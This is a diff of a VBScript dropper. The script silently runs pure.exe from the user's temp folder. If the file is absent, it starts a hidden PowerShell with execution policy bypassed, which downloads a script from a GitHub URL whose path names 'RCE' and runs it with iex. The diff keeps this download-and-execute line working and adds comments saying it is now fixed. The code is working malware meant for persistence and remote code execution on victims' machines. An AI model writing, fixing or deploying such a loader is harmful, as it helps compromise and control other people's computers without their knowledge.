@@ -10,15 +10,16 @@ tempPath = objShell.ExpandEnvironmentStrings("%TEMP%")
 targetFile = tempPath & "\pure.exe"
 
 If objFSO.FileExists(targetFile) Then
-    WScript.Echo "pure.exe was found in the %temp% folder. Starting it now."
+    WScript.Echo "pure.exe was found. Starting it now."
     objShell.Run """" & targetFile & """", 0, False
 Else
-    WScript.Echo "pure.exe not found"
+    WScript.Echo "pure.exe not found. Downloading and executing remote script..."
     scriptUrl = "https://raw.githubusercontent.com/aaaaaaaaaad2131213123123belgia/test/refs/heads/main/presitnace%20RCE"
     
-    ' FIXED: Proper quote escaping - use triple quotes at end: two for literal quote, one to close string
+    ' FIXED LINE 22:
     cmd = "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command ""iex (Invoke-RestMethod '" & scriptUrl & "')"""
     
+    ' Line 23 now works correctly:
     objShell.Run cmd, 0, True
 End If
 
